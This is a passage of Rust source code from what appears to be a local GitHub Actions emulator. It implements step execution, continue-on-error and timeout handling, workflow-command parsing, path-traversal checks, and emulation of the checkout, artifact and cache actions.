    // Return job result
    Ok(JobResult {
        name: matrix_job_name,
        canonical_name: job_name.to_string(),
        status: if job_success {
            JobStatus::Success
        } else {
            JobStatus::Failure
        },
        steps: loop_state.step_results,
        logs: loop_state.job_logs,
        outputs: job_outputs,
    })
}

/// Outcome of a single step after guards (if-condition, continue-on-error) are applied.
enum StepOutcome {
    /// Step ran (or was skipped). Contains the result and whether the job should abort.
    Completed { result: StepResult, abort_job: bool },
    /// Step was skipped due to an if-condition.
    Skipped(StepResult),
}

/// A deferred cache save: key + relative path + workspace.
/// Recorded during `actions/cache` on a miss and flushed at end-of-job,
/// matching GitHub Actions' post-step save semantics.
struct PendingCacheSave {
    key: String,
    path: String,
    workspace: std::path::PathBuf,
}

/// Shared services and resolved context passed through the job/step execution hierarchy.
///
/// Groups secret management, artifact/cache stores, pre-resolved secrets, and
/// upstream job context into a single struct to reduce parameter count.
pub(crate) struct JobServices<'a> {
    /// Secret manager for resolving secrets.
    pub secret_manager: Option<&'a SecretManager>,
    /// Secret masker for redacting secrets in output.
    pub secret_masker: Option<&'a SecretMasker>,
    /// Pre-resolved secrets for expression context (resolved once per job).
    pub secrets_context: &'a HashMap<String, String>,
    /// Job outputs from upstream jobs: `job_name -> { output_key -> output_value }`.
    pub needs_context: &'a HashMap<String, HashMap<String, String>>,
    /// Job results from upstream jobs: `job_name -> "success" | "failure" | "skipped"`.
    pub needs_results: &'a HashMap<String, String>,
    /// Artifact store shared across the workflow run.
    pub artifact_store: &'a crate::artifacts::ArtifactStore,
    /// Cache store shared across the workflow run (persistent across runs).
    pub cache_store: &'a crate::cache::CacheStore,
}

/// Flush pending cache saves. Called at end-of-job only when the job succeeded,
/// matching GitHub Actions' behavior where `actions/cache` saves in a post-step
/// hook that only runs after all steps complete and the job succeeds.
async fn flush_pending_cache_saves(
    pending: &std::sync::Mutex<Vec<PendingCacheSave>>,
    cache_store: &crate::cache::CacheStore,
) {
    let saves = {
        let mut guard = pending.lock().unwrap_or_else(|e| e.into_inner());
        std::mem::take(&mut *guard)
    };
    for save in saves {
        match cache_store
            .save(&save.key, &save.path, &save.workspace)
            .await
        {
            Ok(()) => {
                wrkflw_logging::info(&format!(
                    "  Cache saved path '{}' with key '{}'",
                    save.path, save.key
                ));
            }
            Err(e) => {
                wrkflw_logging::warning(&format!(
                    "  Failed to save cache key '{}': {}",
                    save.key, e
                ));
            }
        }
    }
}

/// Mutable state accumulated during a step loop.
///
/// Shared between `execute_job` and `execute_matrix_job` to avoid duplicating
/// the post-outcome processing logic (status tracking, workflow commands, env
/// file application, logging).
struct StepLoopState {
    step_results: Vec<StepResult>,
    job_logs: String,
    step_outputs_map: HashMap<String, HashMap<String, String>>,
    step_status_map: HashMap<String, (String, String)>,
    job_status_str: String,
}

impl StepLoopState {
    fn new() -> Self {
        Self {
            step_results: Vec::new(),
            job_logs: String::new(),
            step_outputs_map: HashMap::new(),
            step_status_map: HashMap::new(),
            job_status_str: "success".to_string(),
        }
    }

    /// Process one step outcome: record status, log, parse workflow commands,
    /// apply environment file updates. Returns `true` if the job should abort.
    fn process_outcome(
        &mut self,
        outcome: StepOutcome,
        step: &workflow::Step,
        verbose: bool,
        job_env: &mut HashMap<String, String>,
        secret_masker: Option<&SecretMasker>,
    ) -> bool {
        match outcome {
            StepOutcome::Skipped(result) => {
                record_step_status(
                    step.id.as_deref(),
                    &result,
                    &mut self.step_status_map,
                    &mut self.job_status_str,
                );
                self.step_results.push(result);
                false
            }
            StepOutcome::Completed { result, abort_job } => {
                record_step_status(
                    step.id.as_deref(),
                    &result,
                    &mut self.step_status_map,
                    &mut self.job_status_str,
                );

                if verbose || result.status == StepStatus::Failure {
                    self.job_logs.push_str(&format!(
                        "\n=== Output from step '{}' ===\n{}\n=== End output ===\n\n",
                        result.name, result.output
                    ));
                } else {
                    self.job_logs.push_str(&format!(
                        "Step '{}' completed with status: {:?}\n",
                        result.name, result.status
                    ));
                }

                process_workflow_commands(
                    &result.output,
                    step.id.as_deref(),
                    &mut self.step_outputs_map,
                    secret_masker,
                );

                self.step_results.push(result);

                crate::github_env_files::apply_step_environment_updates(
                    job_env,
                    &mut self.step_outputs_map,
                    step.id.as_deref(),
                );

                abort_job
            }
        }
    }
}

/// Record a step's outcome/conclusion in the status tracking map and update job status.
fn record_step_status(
    step_id: Option<&str>,
    result: &StepResult,
    step_status_map: &mut HashMap<String, (String, String)>,
    job_status_str: &mut String,
) {
    if let Some(id) = step_id {
        step_status_map.insert(
            id.to_string(),
            (result.outcome.to_string(), result.conclusion.to_string()),
        );
    }
    if result.conclusion == StepStatus::Failure {
        *job_status_str = "failure".to_string();
    }
}

/// Parse workflow commands from step output and apply their effects.
///
/// Handles the deprecated `::set-output::` command (populates `step_outputs_map`),
/// annotation commands (`::error::`, `::warning::`, `::notice::`, `::debug::`),
/// and `::add-mask::` (adds value to the `SecretMasker` for future output masking).
fn process_workflow_commands(
    output: &str,
    step_id: Option<&str>,
    step_outputs_map: &mut HashMap<String, HashMap<String, String>>,
    secret_masker: Option<&SecretMasker>,
) {
    let commands = crate::workflow_commands::parse_workflow_commands(output);
    for cmd in commands {
        match cmd {
            crate::workflow_commands::WorkflowCommand::SetOutput { name, value } => {
                if let Some(id) = step_id {
                    step_outputs_map
                        .entry(id.to_string())
                        .or_default()
                        .insert(name, value);
                }
            }
            crate::workflow_commands::WorkflowCommand::Error {
                message,
                file,
                line,
                col,
                ..
            } => {
                let loc = format_annotation_location(file.as_deref(), line, col);
                wrkflw_logging::error(&format!("{}{}", loc, message));
            }
            crate::workflow_commands::WorkflowCommand::Warning {
                message,
                file,
                line,
                col,
                ..
            } => {
                let loc = format_annotation_location(file.as_deref(), line, col);
                wrkflw_logging::warning(&format!("{}{}", loc, message));
            }
            crate::workflow_commands::WorkflowCommand::Notice {
                message,
                file,
                line,
                col,
                ..
            } => {
                let loc = format_annotation_location(file.as_deref(), line, col);
                wrkflw_logging::info(&format!("{}{}", loc, message));
            }
            crate::workflow_commands::WorkflowCommand::Debug { message } => {
                wrkflw_logging::debug(&format!("[debug] {}", message));
            }
            crate::workflow_commands::WorkflowCommand::AddMask { value } => {
                if let Some(masker) = secret_masker {
                    masker.add_secret(value);
                }
                wrkflw_logging::debug("::add-mask:: applied (value redacted)");
            }
            // Group, EndGroup, SaveState — no-ops for now
            _ => {}
        }
    }
}

fn format_annotation_location(file: Option<&str>, line: Option<u32>, col: Option<u32>) -> String {
    match (file, line, col) {
        (Some(f), Some(l), Some(c)) => format!("{}:{}:{}: ", f, l, c),
        (Some(f), Some(l), None) => format!("{}:{}: ", f, l),
        (Some(f), None, None) => format!("{}: ", f),
        _ => String::new(),
    }
}

/// Run a step with if-condition and continue-on-error guards.
/// Returns the step result and whether the job should be aborted.
async fn run_step_with_guards(
    step: &Step,
    step_idx: usize,
    job_env: &HashMap<String, String>,
    workflow: &WorkflowDefinition,
    step_exec_ctx: StepExecutionContext<'_>,
) -> Result<StepOutcome, ExecutionError> {
    let step_name = step
        .name
        .clone()
        .unwrap_or_else(|| format!("Step {}", step_idx + 1));

    // Check step-level if condition
    if let Some(if_cond) = &step.if_condition {
        let cond_ctx = step_exec_ctx.expr_context();
        let should_run = evaluate_condition_with_context(if_cond, &cond_ctx);
        if !should_run {
            wrkflw_logging::info(&format!(
                "  {} Skipping step '{}' due to condition: {}",
                wrkflw_logging::symbols::SKIPPED,
                step_name,
                if_cond
            ));
            return Ok(StepOutcome::Skipped(StepResult::new(
                step_name,
                StepStatus::Skipped,
                format!("Skipped due to condition: {}", if_cond),
            )));
        }
    }

    // Wrap step execution with optional step-level timeout; sanitize to avoid panic on negative/NaN.
    // Note: the job-level timeout already wraps the entire step execution, so the step
    // timeout only fires when it is shorter than the remaining job time.
    let step_result = if let Some(minutes) = step.timeout_minutes {
        let safe_mins = sanitize_timeout_minutes(Some(minutes), 360.0);
        let dur = std::time::Duration::from_secs_f64(safe_mins * 60.0);
        match tokio::time::timeout(dur, execute_step(step_exec_ctx)).await {
            Ok(result) => result,
            Err(_) => {
                wrkflw_logging::error(&format!(
                    "  Step '{}' exceeded timeout of {} minutes",
                    step_name, minutes
                ));
                Ok(StepResult::new(
                    step_name.clone(),
                    StepStatus::Failure,
                    format!("Step timed out after {} minutes", minutes),
                ))
            }
        }
    } else {
        execute_step(step_exec_ctx).await
    };

    // Apply continue-on-error semantics and set outcome/conclusion:
    //   outcome  = raw result (before continue-on-error)
    //   conclusion = effective result (after continue-on-error)
    match step_result {
        Ok(mut result) => {
            let (abort_job, conclusion) = if result.status == StepStatus::Failure {
                if step.continue_on_error == Some(true) {
                    wrkflw_logging::info(&format!(
                        "  Step '{}' failed but continue-on-error is set, continuing",
                        result.name
                    ));
                    (false, StepStatus::Success)
                } else {
                    (true, StepStatus::Failure)
                }
            } else {
                (false, result.status)
            };
            result.outcome = result.status;
            result.conclusion = conclusion;
            Ok(StepOutcome::Completed { result, abort_job })
        }
        Err(e) => {
            let (abort_job, conclusion) = if step.continue_on_error == Some(true) {
                wrkflw_logging::info(&format!(
                    "  Step '{}' errored but continue-on-error is set, continuing",
                    step_name
                ));
                (false, StepStatus::Success)
            } else {
                (true, StepStatus::Failure)
            };
            Ok(StepOutcome::Completed {
                result: StepResult {
                    name: step_name,
                    status: StepStatus::Failure,
                    output: format!("Error: {}", e),
                    outcome: StepStatus::Failure,
                    conclusion,
                },
                abort_job,
            })
        }
    }
}

/// Sanitize a timeout-minutes value, returning a safe positive finite number.
/// Falls back to `default` for `None`, `NaN`, `Infinity`, zero, or negative values.
/// Clamps to a maximum of 8640 minutes (6 days).
fn sanitize_timeout_minutes(raw: Option<f64>, default: f64) -> f64 {
    let mins = raw.unwrap_or(default);
    if mins.is_finite() && mins > 0.0 {
        mins.min(360.0 * 24.0)
    } else {
        default
    }
}

// Before the execute_step function, add this struct
struct StepExecutionContext<'a> {
    step: &'a workflow::Step,
    step_idx: usize,
    job_env: &'a HashMap<String, String>,
    working_dir: &'a Path,
    runtime: &'a dyn ContainerRuntime,
    workflow: &'a WorkflowDefinition,
    runner_image: &'a str,
    verbose: bool,
    #[allow(dead_code)]
    matrix_combination: &'a Option<HashMap<String, Value>>,
    container_config: Option<&'a JobContainer>,
    workflow_defaults: Option<&'a workflow::Defaults>,
    job_defaults: Option<&'a workflow::Defaults>,
    step_outputs: &'a HashMap<String, HashMap<String, String>>,
    step_statuses: &'a HashMap<String, (String, String)>,
    job_status: &'a str,
    services: JobServices<'a>,
    /// Collects deferred `actions/cache` saves, flushed at end-of-job on success.
    pending_cache_saves: &'a std::sync::Mutex<Vec<PendingCacheSave>>,
}

impl<'a> StepExecutionContext<'a> {
    /// Build an `ExpressionContext` from this step context.
    fn expr_context(&self) -> crate::expression::ExpressionContext<'_> {
        crate::expression::ExpressionContext {
            env_context: self.job_env,
            step_outputs: self.step_outputs,
            matrix_combination: self.matrix_combination,
            step_statuses: self.step_statuses,
            job_status: self.job_status,
            secrets_context: self.services.secrets_context,
            needs_context: self.services.needs_context,
            needs_results: self.services.needs_results,
        }
    }

    /// Build an `ExpressionContext` using a custom env (e.g. partially-built step env).
    fn expr_context_with_env<'e>(
        &self,
        env: &'e HashMap<String, String>,
    ) -> crate::expression::ExpressionContext<'e>
    where
        'a: 'e,
    {
        crate::expression::ExpressionContext {
            env_context: env,
            step_outputs: self.step_outputs,
            matrix_combination: self.matrix_combination,
            step_statuses: self.step_statuses,
            job_status: self.job_status,
            secrets_context: self.services.secrets_context,
            needs_context: self.services.needs_context,
            needs_results: self.services.needs_results,
        }
    }
}

/// Resolve `${{ }}` expressions in an action `with` parameter value.
///
/// On expression error, returns empty string (matching GitHub Actions behavior
/// where unresolvable expressions resolve to empty).
fn preprocess_with_value(value: &str, ctx: &StepExecutionContext<'_>) -> String {
    let expr_ctx = ctx.expr_context();
    crate::substitution::preprocess_expressions(value, ctx.working_dir, &expr_ctx)
        .unwrap_or_default()
}

/// Handle `actions/upload-artifact` emulation.
async fn handle_upload_artifact(
    step_name: &str,
    ctx: &StepExecutionContext<'_>,
) -> Result<StepResult, ExecutionError> {
    let with = ctx.step.with.as_ref();
    let name = with
        .and_then(|w| w.get("name"))
        .map(|s| preprocess_with_value(s, ctx))
        .unwrap_or_else(|| "artifact".to_string());
    let path_pattern = with
        .and_then(|w| w.get("path"))
        .map(|s| preprocess_with_value(s, ctx))
        .unwrap_or_default();

    if path_pattern.is_empty() {
        return Ok(StepResult::new(
            step_name.to_string(),
            StepStatus::Failure,
            "Required input 'path' not provided for upload-artifact".to_string(),
        ));
    }

    match ctx
        .services
        .artifact_store
        .upload(&name, &path_pattern, ctx.working_dir)
        .await
    {
        Ok(count) => {
            wrkflw_logging::info(&format!(
                "  Uploaded artifact '{}': {} file(s)",
                name, count
            ));
            Ok(StepResult::new(
                step_name.to_string(),
                StepStatus::Success,
                format!("Uploaded artifact '{}': {} file(s)", name, count),
            ))
        }
        Err(e) => Ok(StepResult::new(
            step_name.to_string(),
            StepStatus::Failure,
            format!("Failed to upload artifact '{}': {}", name, e),
        )),
    }
}

/// Handle `actions/download-artifact` emulation.
async fn handle_download_artifact(
    step_name: &str,
    ctx: &StepExecutionContext<'_>,
) -> Result<StepResult, ExecutionError> {
    let with = ctx.step.with.as_ref();
    let name = with
        .and_then(|w| w.get("name"))
        .map(|s| preprocess_with_value(s, ctx))
        .unwrap_or_default();
    let download_path = with
        .and_then(|w| w.get("path"))
        .map(|s| ctx.working_dir.join(preprocess_with_value(s, ctx)))
        .unwrap_or_else(|| ctx.working_dir.to_path_buf());

    // Validate download path stays within workspace (prevent path traversal).
    // If we cannot canonicalize the workspace itself, reject — a non-absolute
    // or non-existent workspace makes the safety check meaningless.
    let canonical_ws = match ctx.working_dir.canonicalize() {
        Ok(p) => p,
        Err(_) => {
            return Ok(StepResult::new(
                step_name.to_string(),
                StepStatus::Failure,
                format!(
                    "download-artifact: cannot verify path safety — \
                     workspace '{}' could not be canonicalized",
                    ctx.working_dir.display()
                ),
            ));
        }
    };
    let is_safe = if let Ok(canonical_dl) = download_path.canonicalize() {
        canonical_dl.starts_with(&canonical_ws)
    } else if let Some(parent) = download_path.parent() {
        parent
            .canonicalize()
            .map(|p| p.starts_with(&canonical_ws))
            .unwrap_or(false)
    } else {
        false
    };
    if !is_safe {
        return Ok(StepResult::new(
            step_name.to_string(),
            StepStatus::Failure,
            format!(
                "download-artifact path '{}' escapes workspace directory",
                download_path.display()
            ),
        ));
    }

    if name.is_empty() {
        // Download all artifacts into named subdirectories
        let names = ctx.services.artifact_store.list().await;
        let mut total = 0;
        for artifact_name in &names {
            let target = download_path.join(artifact_name);
            match ctx
                .services
                .artifact_store
                .download(artifact_name, &target)
                .await
            {
                Ok(c) => total += c,
                Err(e) => {
                    return Ok(StepResult::new(
                        step_name.to_string(),
                        StepStatus::Failure,
                        format!("Failed to download artifact '{}': {}", artifact_name, e),
                    ));
                }
            }
        }
        wrkflw_logging::info(&format!(
            "  Downloaded {} artifact(s), {} file(s) total",
            names.len(),
            total
        ));
        Ok(StepResult::new(
            step_name.to_string(),
            StepStatus::Success,
            format!(
                "Downloaded {} artifact(s), {} file(s) total",
                names.len(),
                total
            ),
        ))
    } else {
        match ctx
            .services
            .artifact_store
            .download(&name, &download_path)
            .await
        {
            Ok(count) => {
                wrkflw_logging::info(&format!(
                    "  Downloaded artifact '{}': {} file(s)",
                    name, count
                ));
                Ok(StepResult::new(
                    step_name.to_string(),
                    StepStatus::Success,
                    format!("Downloaded artifact '{}': {} file(s)", name, count),
                ))
            }
            Err(e) => Ok(StepResult::new(
                step_name.to_string(),
                StepStatus::Failure,
                format!("Failed to download artifact '{}': {}", name, e),
            )),
        }
    }
}

/// Handle `actions/cache` emulation.
async fn handle_cache_action(
    step_name: &str,
    ctx: &StepExecutionContext<'_>,
) -> Result<StepResult, ExecutionError> {
    let with = ctx.step.with.as_ref();
    let key = with
        .and_then(|w| w.get("key"))
        .map(|s| preprocess_with_value(s, ctx))
        .unwrap_or_default();
    let cache_path_raw = with
        .and_then(|w| w.get("path"))
        .map(|s| preprocess_with_value(s, ctx))
        .unwrap_or_default();
    // actions/cache supports multi-line `path` input (one path per line)
    let cache_paths: Vec<String> = cache_path_raw
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();
    let restore_keys: Vec<String> = with
        .and_then(|w| w.get("restore-keys"))
        .map(|s| preprocess_with_value(s, ctx))
        .map(|s| {
            s.lines()
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty())
                .collect()
        })
        .unwrap_or_default();

    if key.is_empty() || cache_paths.is_empty() {
        return Ok(StepResult::new(
            step_name.to_string(),
            StepStatus::Failure,
            "Required inputs 'key' and 'path' not provided for actions/cache".to_string(),
        ));
    }

    // Try to restore each path. A hit on any path counts as a cache hit.
    let mut cache_hit: Option<String> = None;
    for cache_path in &cache_paths {
        let hit = ctx
            .services
            .cache_store
            .restore(&key, &restore_keys, cache_path, ctx.working_dir)
            .await;
        if cache_hit.is_none() {
            cache_hit = hit;
        }
    }

    // Write cache-hit output to GITHUB_OUTPUT file
    if let Some(output_path) = ctx.job_env.get("GITHUB_OUTPUT") {
        let hit_val = if cache_hit.is_some() { "true" } else { "false" };
        if let Err(e) = std::fs::OpenOptions::new()
            .append(true)
            .open(output_path)
            .and_then(|mut f| {
                use std::io::Write;
                writeln!(f, "cache-hit={}", hit_val)
            })
        {
            wrkflw_logging::warning(&format!(
                "Failed to write cache-hit to GITHUB_OUTPUT: {}",
                e
            ));
        }
    }

    match &cache_hit {
        Some(matched_key) => {
            wrkflw_logging::info(&format!("  Cache restored (key: {})", matched_key));
            Ok(StepResult::new(
                step_name.to_string(),
                StepStatus::Success,
                format!("Cache restored (key: {})", matched_key),
            ))
        }
        None => {
            // Defer the save to end-of-job, matching GitHub Actions' behavior where
            // `actions/cache` saves in a post-step hook that only runs after all
            // steps complete and the job succeeds.
            {
                let mut pending = ctx
                    .pending_cache_saves
                    .lock()
                    .unwrap_or_else(|e| e.into_inner());
                for cache_path in &cache_paths {
                    pending.push(PendingCacheSave {
                        key: key.clone(),
                        path: cache_path.clone(),
                        workspace: ctx.working_dir.to_path_buf(),
                    });
                }
            }
            let msg = format!("Cache miss for key '{}'. Save deferred to end of job.", key);
            wrkflw_logging::info(&format!("  {}", msg));
            Ok(StepResult::new(
                step_name.to_string(),
                StepStatus::Success,
                msg,
            ))
        }
    }
}

async fn execute_step(ctx: StepExecutionContext<'_>) -> Result<StepResult, ExecutionError> {
    let step_name = ctx
        .step
        .name
        .clone()
        .unwrap_or_else(|| format!("Step {}", ctx.step_idx + 1));

    if ctx.verbose {
        wrkflw_logging::info(&format!("  Executing step: {}", step_name));
    }

    // Prepare step environment
    let mut step_env = ctx.job_env.clone();

    // Add step-level environment variables (with secret + expression substitution)
    for (key, value) in &ctx.step.env {
        let resolved_value = if let Some(secret_manager) = ctx.services.secret_manager {
            let mut substitution = SecretSubstitution::new(secret_manager);
            match substitution.substitute(value).await {
                Ok(resolved) => resolved,
                Err(e) => {
                    wrkflw_logging::error(&format!(
                        "Failed to resolve secrets in environment variable {}: {}",
                        key, e
                    ));
                    value.clone()
                }
            }
        } else {
            value.clone()
        };
        // Resolve ${{ }} expressions in env values (e.g. ${{inputs.toolchain}})
        let env_expr_ctx = ctx.expr_context_with_env(&step_env);
        let resolved_value = match crate::substitution::preprocess_expressions(
            &resolved_value,
            ctx.working_dir,
            &env_expr_ctx,
        ) {
            Ok(r) => r,
            Err(_) => resolved_value,
        };
        step_env.insert(key.clone(), resolved_value);
    }

    // Execute the step based on its type
    let step_result = if let Some(uses) = &ctx.step.uses {
        // Action step
        let action_info = ctx.workflow.resolve_action(uses);

        // Check if this is the checkout action
        if uses.starts_with("actions/checkout") {
            // Get the current directory (assumes this is where your project is)
            let current_dir = std::env::current_dir().map_err(|e| {
                ExecutionError::Execution(format!("Failed to get current dir: {}", e))
            })?;

            // Copy the project files to the workspace
            copy_directory_contents(&current_dir, ctx.working_dir)?;

            // Add info for logs
            let output = if ctx.verbose {
                let mut detailed_output =
                    "Emulated checkout: Copied current directory to workspace\n\n".to_string();

                // Add checkout action details
                detailed_output.push_str("Checkout Details:\n");
                detailed_output.push_str("  - Source: Local directory\n");
                detailed_output
                    .push_str(&format!("  - Destination: {}\n", ctx.working_dir.display()));

                // Add a summary count instead of listing all files
                if let Ok(entries) = std::fs::read_dir(&current_dir) {
                    let entry_count = entries.count();
                    detailed_output.push_str(&format!(
                        "\nCopied {} top-level items to workspace\n",
                        entry_count
                    ));
                }

                detailed_output
            } else {
                "Emulated checkout: Copied current directory to workspace".to_string()
            };

            if ctx.verbose {
                wrkflw_logging::info(
                    "Emulated actions/checkout: copied project files to workspace",
                );
            }

            StepResult::new(step_name, StepStatus::Success, output)
        } else if uses.starts_with("actions/upload-artifact") {
            handle_upload_artifact(&step_name, &ctx).await?
        } else if uses.starts_with("actions/download-artifact") {
            handle_download_artifact(&step_name, &ctx).await?
        } else if uses.starts_with("actions/cache") {
            handle_cache_action(&step_name, &ctx).await?
        } else {
            // Get action info
            let prepared = prepare_action(&action_info, ctx.runtime).await?;

            match prepared {
                PreparedAction::Composite => {
                    if action_info.is_local {
                        // Handle local composite action
                        let action_path = Path::new(&action_info.repository);
                        execute_composite_action(
                            ctx.step,
                            action_path,
                            &step_env,
                            ctx.working_dir,
                            ctx.runtime,
                            ctx.runner_image,
                            ctx.verbose,
                            &ctx.services,
                            ctx.pending_cache_saves,
                        )
                        .await?
                    } else {
                        // Handle remote composite action: clone the repo and execute
                        let tempdir = tempfile::tempdir().map_err(|e| {
                            ExecutionError::Execution(format!("Failed to create temp dir: {}", e))
                        })?;
                        let repo_url = format!("https://github.com/{}.git", action_info.repository);
                        let repo_dir = tempdir.path().join("action");
                        shallow_clone(&repo_url, &action_info.version, &repo_dir).await?;
                        // If the action has a sub-path, the action.yml is inside that directory
                        let action_dir = match &action_info.sub_path {
                            Some(p) => {
                                sanitize_sub_path(p).map_err(|e| {
                                    ExecutionError::Execution(format!(
                                        "Invalid sub_path for action '{}': {}",
                                        action_info.repository, e
                                    ))
                                })?;
                                let candidate = repo_dir.join(p);
                                // Defense-in-depth: verify the resolved path is
                                // still inside the cloned repo after symlink resolution.
                                let canon_candidate = candidate.canonicalize().map_err(|e| {
                                    ExecutionError::Execution(format!(
                                        "Failed to canonicalize action sub_path: {}",
                                        e
                                    ))
                                })?;
                                let canon_repo = repo_dir.canonicalize().map_err(|e| {
                                    ExecutionError::Execution(format!(
                                        "Failed to canonicalize repo directory: {}",
                                        e
                                    ))
                                })?;
                                if !canon_candidate.starts_with(&canon_repo) {
                                    return Err(ExecutionError::Execution(format!(
                                        "Action sub_path escapes repository directory for action '{}'",
                                        action_info.repository
                                    )));
                                }
                                candidate
                            }
                            None => repo_dir,
                        };
                        // tempdir must stay alive until execute_composite_action completes
                        execute_composite_action(
                            ctx.step,
                            &action_dir,
                            &step_env,
                            ctx.working_dir,
                            ctx.runtime,
                            ctx.runner_image,
                            ctx.verbose,
                            &ctx.services,
                            ctx.pending_cache_saves,
                        )
                        .await?
                    }
                }
                PreparedAction::NativeDocker {
                    image,
                    entrypoint,
                    args,
                } => {
                    execute_native_docker_step(
                        &ctx,
                        &mut step_env,
                        step_name,
                        uses,
                        image,
                        entrypoint,
                        args,
                    )
                    .await?
                }
                PreparedAction::Image(image) => {
                    // Build command for Docker action
                    let mut cmd = Vec::new();
                    let mut owned_strings: Vec<String> = Vec::new(); // Keep strings alive until after we use cmd

                    // Special handling for Rust actions
                    if uses.starts_with("actions-rs/") || uses.starts_with("dtolnay/rust-toolchain")
                    {
                        wrkflw_logging::info(
                            "🔄 Detected Rust action - using system Rust installation",
                        );

                        // For toolchain action, verify Rust is installed
                        if uses.starts_with("actions-rs/toolchain@")
                            || uses.starts_with("dtolnay/rust-toolchain@")
                        {
                            let rustc_version = tokio::process::Command::new("rustc")
                                .arg("--version")
                                .output()
                                .await
                                .map(|output| String::from_utf8_lossy(&output.stdout).to_string())
                                .unwrap_or_else(|_| "not found".to_string());

                            wrkflw_logging::info(&format!(
                                "🔄 Using system Rust: {}",
                                rustc_version.trim()
                            ));

                            // Return success since we're using system Rust
                            return Ok(StepResult::new(
                                step_name,
                                StepStatus::Success,
                                format!("Using system Rust: {}", rustc_version.trim()),
                            ));
                        }

                        // For cargo action, execute cargo commands directly
                        if uses.starts_with("actions-rs/cargo@") {
                            let cargo_version = tokio::process::Command::new("cargo")
                                .arg("--version")
                                .output()
                                .await
                                .map(|output| String::from_utf8_lossy(&output.stdout).to_string())
                                .unwrap_or_else(|_| "not found".to_string());

                            wrkflw_logging::info(&format!(
                                "🔄 Using system Rust/Cargo: {}",
                                cargo_version.trim()
                            ));

                            // Get the command from the 'with' parameters
                            if let Some(with_params) = &ctx.step.with {
                                if let Some(command) = with_params.get("command") {
                                    wrkflw_logging::info(&format!(
                                        "🔄 Found command parameter: {}",
                                        command
                                    ));

                                    // Build the actual command
                                    let mut real_command = format!("cargo {}", command);

                                    // Add any arguments if specified
                                    if let Some(args) = with_params.get("args") {
                                        if !args.is_empty() {
                                            // Resolve GitHub-style matrix variables in args
                                            let resolved_args =
                                                crate::substitution::process_step_run(
                                                    args,
                                                    ctx.matrix_combination,
                                                )
                                                .trim()
                                                .to_string();

                                            // Only add if we have something left after resolving variables
                                            // and it's not just "--target" without a value
                                            if !resolved_args.is_empty()
                                                && resolved_args != "--target"
                                            {
                                                real_command
                                                    .push_str(&format!(" {}", resolved_args));
                                            }
                                        }
                                    }

                                    wrkflw_logging::info(&format!(
                                        "🔄 Running actual command: {}",
                                        real_command
                                    ));

                                    // Execute the command
                                    let mut cmd = tokio::process::Command::new("sh");
                                    cmd.arg("-c");
                                    cmd.arg(&real_command);
                                    cmd.current_dir(ctx.working_dir);

                                    // Add environment variables
                                    for (key, value) in &step_env {
                                        cmd.env(key, value);
                                    }

                                    match cmd.output().await {
                                        Ok(output) => {
                                            let exit_code = output.status.code().unwrap_or(-1);
                                            let stdout =
                                                String::from_utf8_lossy(&output.stdout).to_string();
                                            let stderr =
                                                String::from_utf8_lossy(&output.stderr).to_string();

                                            return Ok(StepResult::new(
                                                step_name,
                                                if exit_code == 0 {
                                                    StepStatus::Success
                                                } else {
                                                    StepStatus::Failure
                                                },
                                                format!("{}\n{}", stdout, stderr),
                                            ));
                                        }
                                        Err(e) => {
                                            return Ok(StepResult::new(
                                                step_name,
                                                StepStatus::Failure,
                                                format!("Failed to execute command: {}", e),
                                            ));
                                        }
                                    }
                                }
                            }
                        }
                    }

                    if action_info.is_docker {
                        // Docker actions just run the container
                        cmd.push("sh");
                        cmd.push("-c");
                        cmd.push("echo 'Executing Docker action'");
                    } else if action_info.is_local {
                        // Local actions: run a placeholder since full local action
                        // execution is handled by the Composite branch above
                        cmd.push("sh");
                        cmd.push("-c");
                        cmd.push("echo 'Local action executed'");
                    } else {
                        // For GitHub actions, check if we have special handling
                        if let Err(e) = emulation::handle_special_action(uses).await {
                            wrkflw_logging::warning(&format!(
                                "Special action handling failed: {}",
                                e
                            ));
                        }

                        // Check if we should hide GitHub action messages
                        let hide_action_value = ctx
                            .job_env
                            .get("WRKFLW_HIDE_ACTION_MESSAGES")
                            .cloned()
                            .unwrap_or_else(|| "not set".to_string());

                        wrkflw_logging::debug(&format!(
                            "WRKFLW_HIDE_ACTION_MESSAGES value: {}",
                            hide_action_value
                        ));

                        let hide_messages = hide_action_value == "true";
                        wrkflw_logging::debug(&format!("Should hide messages: {}", hide_messages));

                        // Only log a message to the console if we're showing action messages
                        if !hide_messages {
                            wrkflw_logging::info(&format!("Would execute GitHub action: {}", uses));
                        }

                        // Extract the actual command from the GitHub action if applicable
                        let mut should_run_real_command = false;
                        let mut real_command_parts = Vec::new();

                        // Check if this action has 'with' parameters that specify a command to run
                        if let Some(with_params) = &ctx.step.with {
                            // Common GitHub action pattern: has a 'command' parameter
                            if let Some(cmd) = with_params.get("command") {
                                if ctx.verbose {
                                    wrkflw_logging::info(&format!(
                                        "🔄 Found command parameter: {}",
                                        cmd
                                    ));
                                }

                                // Convert to real command based on action type patterns
                                if uses.contains("cargo") || uses.contains("rust") {
                                    // Cargo command pattern
                                    real_command_parts.push("cargo".to_string());
                                    real_command_parts.push(cmd.clone());
                                    should_run_real_command = true;
                                } else if uses.contains("node") || uses.contains("npm") {
                                    // Node.js command pattern
                                    if cmd == "npm" || cmd == "yarn" || cmd == "pnpm" {
                                        real_command_parts.push(cmd.clone());
                                    } else {
                                        real_command_parts.push("npm".to_string());
                                        real_command_parts.push("run".to_string());
                                        real_command_parts.push(cmd.clone());
                                    }
                                    should_run_real_command = true;
                                } else if uses.contains("python") || uses.contains("pip") {
                                    // Python command pattern
                                    if cmd == "pip" {
                                        real_command_parts.push("pip".to_string());
                                    } else {
                                        real_command_parts.push("python".to_string());
                                        real_command_parts.push("-m".to_string());
                                        real_command_parts.push(cmd.clone());
                                    }
                                    should_run_real_command = true;
                                } else {
                                    // Generic command - try to execute directly if available
                                    real_command_parts.push(cmd.clone());
                                    should_run_real_command = true;
                                }

                                // Add any arguments if specified
                                if let Some(args) = with_params.get("args") {
                                    if !args.is_empty() {
                                        // Resolve GitHub-style matrix variables in args
                                        let resolved_args = crate::substitution::process_step_run(
                                            args,
                                            ctx.matrix_combination,
                                        )
                                        .trim()
                                        .to_string();

                                        // Only add if we have something left after resolving variables
                                        if !resolved_args.is_empty() {
                                            real_command_parts.push(resolved_args);
                                        }
                                    }
                                }
                            }
                        }

                        if should_run_real_command && !real_command_parts.is_empty() {
                            // Build a final command string
                            let command_str = real_command_parts.join(" ");
                            wrkflw_logging::info(&format!(
                                "🔄 Running actual command: {}",
                                command_str
                            ));

